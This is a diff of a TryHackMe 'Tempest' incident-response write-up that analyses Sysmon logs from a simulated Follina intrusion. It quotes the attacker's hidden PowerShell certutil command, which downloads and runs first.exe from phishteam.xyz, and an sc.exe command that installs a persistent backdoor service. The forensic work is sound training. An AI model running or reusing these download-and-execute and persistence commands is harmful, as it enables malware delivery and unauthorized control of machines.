@@ -18,11 +18,11 @@ Before conducting the investigation let's look at the incident files and their h
 ### Task 4: Initial Access - Malicious Document
 SOC analyst report the intrusion started with a malicious **.doc** file which was downloaded via **chrome.exe**. The document executed a chain of commands to attain code execution.
 
-For this task use the EvtxEcmd tool located at `C:\\Tools\\EvtxECmd`, Timeline Explorer (GUI tool for reading logs from CSV files).
+For this task use the EvtxEcmd tool located at `C:\Tools\EvtxECmd`, Timeline Explorer (GUI tool for reading logs from CSV files).
 
 To parse the logs convert the sysmon .evtx file to a .csv file using the EvtxECmd tool, so we can later access it using the Timeline explorer and SysmonView tool.
 
-`C:\\Tools\\EvtxEcmd\\EvtxECmd.exe -f 'C:\\Users\\user\\Desktop\\Incident Files\\sysmon.evtx' --csv 'C:\\Users\\user\\Desktop\\Incident Files' --csvf sysmon.csv`
+`C:\Tools\EvtxEcmd\EvtxECmd.exe -f 'C:\Users\user\Desktop\\Incident Files\\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv`
 
 Next open up the .csv file in the Timeline Explorer tool to display and analyse the logs. Since the malicios document is a **.doc** file we can look for it with the search bar. When a file is downloaded, it's sysmon event ID is 11, so we can filter for that specific ID, which gives us further insight.
 
@@ -62,7 +62,7 @@ As we've seen in the previous task the malware creates a file in the startup fol
 Since we already know the payload is being downloaded from phishteam[.]xyz domain, to find the executed command on startup we have to look for the phishteam domain through the search bar.
 
 To save yourself the trouble make sure you remove the double quotes before submitting the answer.
->`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe`
+>`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
 
 From here we can see that the malware downloads a file first.exe and runs it. The SHA256 hash of the file can be found in the Payload Data3 field of the log which contains first.exe in the Executable Info field.
 >SHA256:*CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8*
@@ -115,7 +115,7 @@ I then used VirusTotal to find the name of the file by inputting the SHA256 hash
 ![](assets/Pasted%20image%2020260302165859.png)
 >Name: *chisel*
 
-After the reverse proxy being setup we see the command `C:\\Windows\\system32\\wsmprovhost.exe -Embedding`. Then after googling what service is it we find the answer.
+After the reverse proxy being setup we see the command `C:\Windows\system32\wsmprovhost.exe -Embedding`. Then after googling what service is it we find the answer.
 >Service: *winrm*
 
 ### Task 8: Privilege Escalation - Exploiting Privileges
@@ -157,7 +157,7 @@ The account was successfully added to a sensitive group. We can find the event I
 After creating the accounts, the attacker established persistent administrative access. The command executed can be found by searching for `final.exe` and looking at the Executable Info field. We can see the attacker using `TempestUpdate2` in the command as well as the `final.exe` with goals of the malware autostarting.
 ![](assets/Pasted%20image%2020260302175136.png)
 
->Command: *C:\\Windows\\system32\\sc.exe \\\\TEMPEST create TempestUpdate2 binpath= C:\\ProgramData\\final.exe start= auto*
+>Command: *C:\Windows\system32\sc.exe \TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto*
 
 ### Summary
 The **Tempest Incident** is a TryHackMe room simulating a full attack chain on a Windows endpoint. The attacker gained initial access by delivering a malicious Word document (`free_magicules.doc`) that exploited **CVE-2022-30190 (Follina)** — abusing the `ms-msdt` URI protocol to execute PowerShell without macros. A base64-encoded payload downloaded `update.zip` from `phishteam[.]xyz` into the Startup folder, ensuring persistence. Stage 2 used `first.exe` (a Nim-compiled binary) connecting to `resolvcyber.xyz:80` as a C2 server. The attacker then performed internal reconnaissance via encoded GET requests, used **Chisel** (`ch.exe`) to establish a reverse SOCKS proxy back to `167.71.199.191:8080`, and pivoted via WinRM (port 5985). Privilege escalation was achieved through **PrintSpoofer** (`spf.exe`), exploiting **SeImpersonatePrivilege** to reach SYSTEM. Finally, the attacker created backdoor accounts (`shion`, `shuna`), added `shion` to the Administrators group, and installed a persistent service (`TempestUpdate2`) running `final.exe`.
